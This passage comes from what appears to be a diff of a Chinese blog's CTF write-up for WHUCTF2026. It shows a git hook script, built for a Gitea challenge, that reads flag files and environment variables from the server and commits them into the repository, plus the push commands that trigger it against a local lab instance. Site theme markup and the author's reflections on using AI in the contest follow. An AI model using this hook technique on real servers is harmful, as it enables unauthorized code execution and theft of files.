class="hljs-variable">$COMMIT</span><br><br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line"># 读取推送信息：oldrev, newrev, 分支名（例如 refs/heads/main）</span><br><span class="line"></span><br><span class="line">while read oldrev newrev refname; do</span><br><span class="line"></span><br><span class="line">if [ "$refname" = "refs/heads/main" ] || [ "$refname" = "refs/heads/master" ]; then</span><br><span class="line"></span><br><span class="line">TARGET_BRANCH=$refname</span><br><span class="line"></span><br><span class="line">NEWREV=$newrev</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"># 如果标准输入无数据（极少情况），手动指定分支和当前 HEAD 作为新提交</span><br><span class="line"></span><br><span class="line">if [ -z "$TARGET_BRANCH" ]; then</span><br><span class="line"></span><br><span class="line">TARGET_BRANCH="refs/heads/main"</span><br><span class="line"></span><br><span class="line">NEWREV=$(git rev-parse HEAD)</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"># 进入 bare 仓库目录</span><br><span class="line"></span><br><span class="line">cd $GIT_DIR</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"># === 核心：搜索并读取 flag ===</span><br><span class="line"></span><br><span class="line">FLAG=$(cat /flag 2&gt;/dev/null || cat /flag.txt 2&gt;/dev/null || \</span><br><span class="line"></span><br><span class="line">cat /app/flag 2&gt;/dev/null || \</span><br><span class="line"></span><br><span class="line">printenv FLAG 2&gt;/dev/null || \</span><br><span class="line"></span><br><span class="line">find / -name "flag*" -type f -exec cat {} \; 2&gt;/dev/null | head -c 1000)</span><br><span class="line"></span><br><span class="line">if [ -z "$FLAG" ]; then</span><br><span class="line"></span><br><span class="line">FLAG="flag_not_found_but_hook_worked"</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"># === 将 flag 写入仓库文件（在 bare 仓库中） ===</span><br><span class="line"></span><br><span class="line"># 1. 将 flag 内容存入 Git 对象数据库，得到 blob 哈希</span><br><span class="line"></span><br><span class="line">BLOB=$(echo "$FLAG" | git hash-object -w --stdin)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"># 2. 用这个 blob 构建一个临时树对象，内容为 "flag.txt" 文件</span><br><span class="line"></span><br><span class="line">TREE=$(printf "100644 blob %s\tflag.txt\n" "$BLOB" | git mktree)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"># 3. 基于临时树对象创建新提交，父提交为 NEWREV（刚推送成功的提交）</span><br><span class="line"></span><br><span class="line">COMMIT=$(echo "add flag" | git commit-tree $TREE -p $NEWREV)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"># 4. 将目标分支的引用指针强制更新到新提交（相当于在 main 上追加了包含 flag.txt 的提交）</span><br><span class="line"></span><br><span class="line">git update-ref $TARGET_BRANCH $COMMIT</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 <p>新建一个仓库然后pull下来</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> http://127.0.0.1:42147/sec/flagrepo.git<br><br><span class="hljs-built_in">cd</span> flagrepo<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">"final trigger"</span> &gt; trigger.txt<br><br>git add trigger.txt<br><br>git commit -m <span class="hljs-string">"trigger"</span><br><br>git push origin main<br><br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">git clone http://127.0.0.1:42147/sec/flagrepo.git</span><br><span class="line"></span><br><span class="line">cd flagrepo</span><br><span class="line"></span><br><span class="line">echo "final trigger" &gt; trigger.txt</span><br><span class="line"></span><br><span class="line">git add trigger.txt</span><br><span class="line"></span><br><span class="line">git commit -m "trigger"</span><br><span class="line"></span><br><span class="line">git push origin main</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
 
 <h2 id="一点想法"><a href="#一点想法" class="headerlink" title="一点想法"></a>一点想法</h2><p>怎么说呢感到非常抱歉，因为光靠自己的能力是完全不够的，但是AI也没完全发力，可能因为梯子或者网线的问题这次web都不太流畅，然后codex和网页版gpt也登不上去，只能用D老师凑合（反而呢给我提供了很多没用的信息，你说对吧大象）对团队的贡献超级低吧……一直很自责如果多出两个题就好了……</p>
@@ -451,380 +735,372 @@ mjx-container[display="true"] + br {
 <p>打反弹shell非常少，也是狠狠学习了。</p>
 <p>总得来说AI给我的冲击非常大，尤其是这种不禁AI的比赛，为了得分大家都大量使用AI了，于是也不得不使用，但是感到由衷的惭愧，因为感觉到实际上凭借自己的能力应该是做不出来的…….很愧疚吧</p>
 
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
+		</div>
 
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> WHUCTF2026</li>
+        <li><strong>Author:</strong> blank</li>
+        <li><strong>Created at
+                :</strong> 2026-04-29 16:06:29</li>
         
-  <a href="/categories/wp/" class="category-chain-item">wp</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
-      
-    </div>
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>WHUCTF2026</div>
-      <div>https://b1ank799.github.io/2026/04/29/WHUCTF2026/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>Author</div>
-          <div>blank</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>Posted on</div>
-          <div>April 29, 2026</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>Licensed under</div>
-          <div>
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-05-05 16:34:02
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://b1ank799.github.io/2026/04/29/WHUCTF2026/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
             
-              
-              
-                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
-                    <i class="iconfont icon-cc-by"></i>
-                  </span>
-                </a>
-              
-            
-          </div>
-        </div>
-      
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
-
-
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2026/05/05/%E5%B9%BF%E5%B7%9E%E8%A1%8C/" title="广州行">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">广州行</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2026/01/22/blog%E9%87%8D%E6%96%B0%E5%BC%80%E5%BC%A0%E7%A2%8E%E7%A2%8E%E5%BF%B5/" title="blog重新开张碎碎念">
-                        <span class="hidden-mobile">blog重新开张碎碎念</span>
-                        <span class="visible-mobile">Next</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
 
             
-  
-  
-    <article id="comments" lazyload>
-      
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
 
-    </article>
-  
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/ctf/">#ctf</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2026/05/05/%E5%B9%BF%E5%B7%9E%E8%A1%8C/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">广州行</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/01/22/blog%E9%87%8D%E6%96%B0%E5%BC%80%E5%BC%A0%E7%A2%8E%E7%A2%8E%E5%BF%B5/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">blog重新开张碎碎念</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
 
 
-          </article>
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.js';
+
+      (function() {
+        const startPath = location.pathname;
+        const startTime = Date.now();
+        const retryDelay = 200;
+        const retryLimit = 5000;
+
+        const runWaline = () => {
+          if (location.pathname !== startPath) {
+            return;
+          }
+
+          const container = document.getElementById('waline');
+          if (!container) {
+            if (Date.now() - startTime < retryLimit) {
+              setTimeout(runWaline, retryDelay);
+            }
+            return;
+          }
+
+          if (window.redefineWalineInstance?.destroy) {
+            window.redefineWalineInstance.destroy();
+          }
+
+          container.innerHTML = '';
+          window.redefineWalineInstance = init({
+            el: '#waline',
+            serverURL: 'https://example.example.com',
+            path: location.pathname,
+            dark: 'body[class~="dark-mode"]',
+            reaction: false,
+            requiredMeta: ['nick', 'mail'],
+            emoji: [],
+                      lang: 'zh-CN',
+          });
+        };
+
+        runWaline();
+      })();
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">WHUCTF2026</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Hell-City-solved"><span class="nav-text">Hell City[solved]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E6%B3%A8need-solved"><span class="nav-text">注注need[solved]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E6%B3%A8need-revenge-solved"><span class="nav-text">注注need_revenge[solved]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Nespresso-solved"><span class="nav-text">Nespresso[solved]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gitea"><span class="nav-text">gitea</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E7%82%B9%E6%83%B3%E6%B3%95"><span class="nav-text">一点想法</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">blank</a>
+            
         </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header">
-    <i class="iconfont icon-list"></i>
-    <span>Table of Contents</span>
-  </p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
         </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="Image viewer">
+	<button class="image-viewer-close" type="button" aria-label="Close">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="Prev">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="Close">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="Next">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
 </div>
 
-    
 
-    
-  </main>
+	
 
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-    </div>
-  
-  
-  
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
+</main>
 
 
 
+<script src="/js/build/libs/Swup.min.js"></script>
 
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
 
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
 
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
 
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
 
-  
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
 <script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
     });
-  });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
 </script>
 
 
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
 
-  <script>Fluid.plugins.codeWidget();</script>
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+
+
+
 
 
   
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
+<script src="/js/build/libs/Typed.min.js"></script>
 
 
 
 
 
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
 
 
-  
 
-  <noscript>
-    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
-  </noscript>
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
 </body>
+
 </html>
